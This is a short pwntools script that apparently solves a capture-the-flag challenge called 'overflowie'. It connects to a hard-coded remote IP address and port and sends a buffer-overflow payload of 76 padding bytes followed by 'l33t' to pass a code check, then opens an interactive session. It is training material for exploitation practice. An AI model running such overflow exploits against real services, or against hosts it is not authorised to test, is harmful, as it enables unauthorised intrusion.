from pwn import *

IP = "34.107.86.157"
port = 30987

elf = ELF("./overflowie")


# p = elf.process()
p = remote(IP, port)

p.recvuntil("Enter the very secure code to get the flag:")

payload = [
    b"A" * 76,
    b"l33t"
]

payload = b''.join(payload)

p.sendline(payload)

p.interactive()